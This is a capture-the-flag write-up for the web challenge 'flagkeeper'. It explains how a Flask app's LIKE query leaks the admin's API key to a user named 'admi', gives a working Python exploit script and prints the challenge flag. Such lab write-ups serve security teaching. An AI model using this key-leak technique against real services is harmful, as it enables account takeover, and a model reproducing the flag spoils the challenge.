# flagkeeper

[library.m0unt41n.ch/challenges/flagkeeper](https://library.m0unt41n.ch/challenges/flagkeeper) ![](../../resources/web.svg) ![](../../resources/easy.svg) 

# TL;DR

Simple SQL(ite) injection.

# The app

We get a Flask app. We can

*   Register a user and log in
    *   The user will be assigned a random hex *"API Key"*.
    *   And also a random hex `flag`
*   View "profile" - just the username and the API Key
*   A similarly simple "dashboard", for viewing the flag

The real flag is stored in `admin` user account, initialized at start.

Looking at the code of the underlying API, there is more:

*   `GET /api/key` - returns the API key for current user
*   `POST /api/token_login` - allows login, but with the API key
    instead of password
*   `GET /api/flag` - returns the flag for current user

# The bug

In the `/api/key` handler we have:

```python
@app.route("/api/key", methods=["GET"])
def apikey():
    if "username" not in session:
        return Response(status=401, response="Unauthorized")
    db = get_db()
    cursor = db.cursor()
    cursor.execute(
        "SELECT apikey FROM users WHERE username LIKE ?", (session["username"] + "%",)
    )
    user = cursor.fetchall()
    return Response(status=200, response=json.dumps(user))
```

Note the **`LIKE ?`** part. This means that if we register a user with
name similar-enough to admin, that query will return his API key.
Which we can then use with `/api/token_login` and get the flag.

We aren't free to use SQL injection directly in the username:

```python
    valid_chars = string.ascii_letters + string.digits
    if not all(c in valid_chars for c in username):
        return Response(status=400, response="Invalid username")
```

But, see above `/api/key` handler - it conveniently does this for us &#128512;

With that, the exploitation is simple:

```python
import requests
import json

URL="http://localhost:5000"

s = requests.session()
r = s.post(URL+"/api/register", data={
    "username": "admi",
    "password": "admi"
})
print(r.text)
r = s.get(URL+"/api/key")
print(r.text)
j = json.loads(r.text)
print(j)
for k in j:
    key = k[0]
    r = s.post(URL+"/api/token_login", data={
        "apikey": key,
    })
    print(r.text)
    r = s.get(URL+"/api/flag")
    print(r.text)
```

---

## `stairctf{4lm0st_l1k3_th3_4dm1n!}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
